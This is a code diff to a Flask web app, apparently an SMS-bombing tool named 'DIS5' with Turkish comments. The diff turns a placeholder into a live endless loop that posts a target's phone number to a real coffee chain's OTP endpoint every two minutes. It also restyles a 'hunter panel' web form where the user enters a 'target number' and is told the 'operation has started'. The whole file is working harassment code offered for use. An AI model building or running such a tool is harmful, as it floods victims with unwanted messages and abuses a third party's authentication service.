@@ -1,146 +1,64 @@
-import requests, time, threading, random
+import requests, time, threading, os
 from flask import Flask, render_template_string, request
 
 app = Flask(__name__)
 
-# --- DIS5 MOTORU (2 Dakikalık Pusu Modu) ---
+# --- MOTOR: hot-site-eu STANDARDI ---
 def attack_engine(phone):
     p = "".join(filter(str.isdigit, phone))
     if p.startswith("0"): p = p[1:]
-    
-    # Buradaki listeye kendi API'lerini ekleyebilirsin liderim
-    # Motoru dokunulmaz kıldık, 24 saat boyunca 2 dk arayla vurur.
+    if p.startswith("90") and len(p) > 10: p = p[2:]
+
     while True:
         try:
-            # Örnek İstek (Senin API listene göre genişletilir)
-            # requests.post("API_URL", json={"phone": p})
-            pass
+            # Kahve Dünyası Ateşleme
+            requests.post("https://api.kahvedunyasi.com/v1/auth/otp", 
+                          json={"mobile_number": p, "country_code": "90"},
+                          timeout=10)
         except:
             pass
         time.sleep(120)
 
-# --- AVCI PANELİ (Lüks Design v12) ---
+# --- TASARIM: DIS5 THE TECHNOLOGY OF EUROPE'S ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html lang="tr">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <title>DIS5 - OFFICIAL</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DIS5 - EUROPE'S OF PHONE</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            /* Arka plana logonun linkini aşağıya koy liderim */
-            background: #000 url('https://i.ibb.co/vzYv3y5/dis5-logo.png') no-repeat center center fixed;
-            background-size: contain;
-            font-family: 'Orbitron', sans-serif;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-        }
-
-        .avci-container {
-            background: rgba(0, 0, 0, 0.9);
-            border: 2px solid #ff6600;
-            box-shadow: 0 0 50px rgba(0, 204, 255, 0.4);
-            padding: 50px;
-            border-radius: 30px;
-            text-align: center;
-            width: 400px;
-            z-index: 10;
-        }
-
-        h1 {
-            color: #ff6600;
-            font-size: 22px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            margin-bottom: 5px;
-        }
-
-        .subtitle {
-            color: #00ccff;
-            font-size: 12px;
-            margin-bottom: 30px;
-            font-weight: bold;
-        }
-
-        input[type="text"] {
-            width: 100%;
-            padding: 15px;
-            margin-bottom: 20px;
-            background: #111;
-            border: 1px solid #333;
-            color: #00ccff;
-            border-radius: 8px;
-            text-align: center;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-
-        button {
-            width: 100%;
-            padding: 15px;
-            background: #ff6600;
-            color: #fff;
-            border: none;
-            border-radius: 8px;
-            font-weight: bold;
-            font-size: 18px;
-            cursor: pointer;
-            transition: 0.4s;
-        }
-
-        button:hover {
-            background: #00ccff;
-            box-shadow: 0 0 20px #00ccff;
-        }
-
-        #success-screen {
-            display: none;
-        }
-
-        .op-logo {
-            width: 100%;
-            max-width: 250px;
-            margin-bottom: 20px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.05); opacity: 1; }
-            100% { transform: scale(1); opacity: 0.8; }
-        }
+        body { background-color: #001a33; color: white; text-align: center; font-family: sans-serif; padding: 20px; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .panel { background: rgba(0,0,0,0.85); border: 2px solid #ff6600; padding: 30px; border-radius: 20px; width: 100%; max-width: 350px; box-shadow: 0 0 20px #003366; }
+        .logo { width: 100%; max-width: 220px; margin-bottom: 10px; }
+        h2 { font-size: 14px; color: #ff6600; margin-bottom: 25px; text-transform: uppercase; letter-spacing: 1px; }
+        .input-group { display: flex; align-items: center; background: #111; border: 1px solid #333; border-radius: 8px; margin-bottom: 20px; overflow: hidden; }
+        .prefix { padding: 12px; color: #ff6600; font-weight: bold; background: #222; border-right: 1px solid #333; }
+        input { background: transparent; border: none; color: white; padding: 12px; width: 100%; outline: none; font-size: 18px; text-align: center; }
+        button { background: #ff6600; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; font-size: 18px; transition: 0.3s; }
+        button:hover { background: #cc5200; box-shadow: 0 0 10px #ff6600; }
+        #status { display: none; color: #00ff00; margin-top: 20px; font-weight: bold; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0.5; } }
     </style>
 </head>
 <body>
-
-    <div class="avci-container" id="panel">
-        <div id="input-screen">
-            <h1>DIS5 Europe's Of Phone</h1>
-            <p class="subtitle">AV DEĞİL, AVCI PANELİ</p>
-            <form method="POST" onsubmit="startOp()">
-                <input type="text" name="phone" placeholder="HEDEF NUMARA" required>
-                <button type="submit">SUCCESS (TETİKLE)</button>
+    <div class="panel">
+        <img src="https://i.ibb.co/vzYv3y5/dis5-logo.png" class="logo">
+        <h2>The Technology Of Europe’s</h2>
+        <div id="ui">
+            <form method="POST" onsubmit="start()">
+                <div class="input-group">
+                    <span class="prefix">+90</span>
+                    <input type="text" name="phone" placeholder="5XXXXXXXXX" required maxlength="10">
+                </div>
+                <button type="submit">SUCCESS</button>
             </form>
         </div>
-
-        <div id="success-screen">
-            <img src="https://i.ibb.co/vzYv3y5/dis5-logo.png" class="op-logo">
-            <h2 style="color: #ff6600;">OPERASYON BAŞLADI</h2>
-            <p style="color: #00ccff;">Render Motoru Devreye Girdi.</p>
-        </div>
+        <div id="status">OPERASYON BAŞLADI!</div>
     </div>
-
     <script>
-        function startOp() {
-            document.getElementById('input-screen').style.display = 'none';
-            document.getElementById('success-screen').style.display = 'block';
-            document.getElementById('panel').style.borderColor = '#00ccff';
+        function start() {
+            document.getElementById('ui').style.display = 'none';
+            document.getElementById('status').style.display = 'block';
         }
     </script>
 </body>
@@ -156,4 +74,4 @@ def index():
     return render_template_string(HTML_TEMPLATE)
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=10000)
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
